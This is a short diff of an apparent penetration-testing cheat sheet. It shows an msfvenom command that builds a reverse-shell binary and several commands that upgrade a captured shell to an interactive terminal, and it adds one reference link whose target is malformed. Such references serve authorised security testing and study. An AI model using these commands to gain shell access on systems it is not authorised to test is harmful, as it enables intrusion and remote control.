@@ -100,11 +100,13 @@ AWK
     msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
     
 ## Upgrading to a pseudo terminal / TTY     
-[Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+[Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)  
+[What Happens in a Shell Upgrade?](What Happens In a "Shell Upgrade"?)   
 
     python -c 'import pty;pty.spawn("/bin/bash")' 
     echo os.system('/bin/bash')
     /bin/sh -i  
+    script /dev/null -c bash      #create new pty owned by current user, fixed in newer versions of screen        
     
     SHELL=/bin/bash script -q /dev/null        Ctrl-Z        stty raw -echo        fg    reset    xterm
     
